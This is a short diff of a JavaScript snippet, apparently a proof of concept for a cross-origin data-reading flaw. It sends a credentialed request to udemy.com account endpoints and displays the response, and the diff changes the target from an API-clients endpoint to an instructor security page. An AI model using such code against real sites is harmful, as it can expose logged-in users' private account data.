@@ -6,7 +6,7 @@ xhttp.onreadystatechange = function() {
     document.getElementById("demo").innerHTML = this.responseText;    
     }  
 };  
-xhttp.open("GET", "https://www.udemy.com/api-2.0/users/me/api-clients", true);  
+xhttp.open("GET", "https://www.udemy.com/instructor/account/security/", true);  
 xhttp.withCredentials = true;  
 xhttp.send();
 }
